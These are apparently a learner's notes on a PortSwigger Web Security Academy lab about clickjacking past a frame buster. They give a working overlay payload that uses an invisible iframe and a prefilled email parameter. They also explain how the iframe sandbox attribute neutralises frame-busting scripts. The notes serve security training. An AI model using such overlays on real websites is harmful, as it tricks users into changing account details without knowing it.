# [Clickjacking with a frame buster script](https://portswigger.net/web-security/clickjacking/lab-frame-buster-script)

> goal is to create an overlay for the webapp and trick the user to change the email address

- the burp browser is the best option for the testing of the style
- set the opacity to 0.5 to align the click me with the delete button
- when it is aligned set the opacity to 0.0001

```
<style>
  iframe {
    position: relative;
    width: 800px;
    height: 800px;
    opacity: 0.001;
    z-index: 2;
  }
  div {
    position: absolute;
    top: 460px;
    left: 50px;
    z-index: 1;
  }
</style>
<div>click me</div>
<iframe
  src="https://xxx.web-security-academy.net/my-account?email=quack@duck"
  sandbox="allow-forms"
></iframe>
```

> the logged in user url can reflect a prefilled input like `?email=quack@duck`, making the the click me div tag overlay the update email button, on the user click the email will be updated

> frame busters stops the iframe to render the content, an effective workaround against frame busters is to use the HTML5 iframe `sandbox` attribute.

```
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```

or

```
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-scripts"></iframe>
```

- When `sandbox="allow-forms"` or `sandbox="allow-scripts"` and the `allow-top-navigation` value is omitted the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window
